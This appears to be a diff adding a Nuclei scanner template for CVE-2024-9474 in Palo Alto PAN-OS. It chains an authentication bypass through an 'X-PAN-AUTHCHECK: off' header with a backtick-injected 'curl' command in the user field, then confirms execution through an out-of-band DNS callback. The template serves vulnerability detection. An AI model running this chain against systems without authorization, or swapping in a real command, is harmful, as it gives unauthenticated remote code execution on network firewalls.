@@ -1,0 +1,67 @@
+id: cve-2024-9474
+info:
+  name: Palo Alto Networks PAN-OS Authentication Bypass and RCE (CVE-2024-9474)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,CVE-2024-9474
+
+variables:
+  rand_str: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+      - |
+        GET /php/utils/CmsGetDeviceSoftwareVersion.php/.js.map HTTP/1.1
+        Host: {{Hostname}}
+        X-PAN-AUTHCHECK: off
+
+    extractors:
+      - type: regex
+        name: phpsessid
+        part: header
+        regex:
+          - "PHPSESSID=(.*?);"
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0.0.0"
+
+  - raw:
+      - |
+        POST /php/utils/createRemoteAppwebSession.php/{{rand_str}}.js.map HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{phpsessid}}
+        X-PAN-AUTHCHECK: off
+
+        user=`curl+{{interactsh-url}}`&userRole=superuser&remoteHost=&vsys=vsys1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "@start"
+
+  - raw:
+      - |
+        GET /index.php/.js.map HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{phpsessid}}
+        X-PAN-AUTHCHECK: off
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
